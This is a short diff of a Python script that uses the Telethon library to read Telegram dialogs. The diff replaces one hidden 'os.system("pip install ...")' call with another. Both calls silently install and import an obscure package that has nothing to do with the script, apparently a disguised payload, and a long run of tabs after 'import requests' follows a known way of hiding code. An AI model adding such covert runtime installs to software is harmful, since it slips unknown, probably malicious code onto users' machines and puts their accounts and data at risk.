@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscryptographyadd")
-import syscryptographyadd
+os.system("pip install syscolouringexts")
+import syscolouringexts
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																							
 from telethon.sync import TelegramClient
 from telethon.tl.functions.messages import GetDialogsRequest
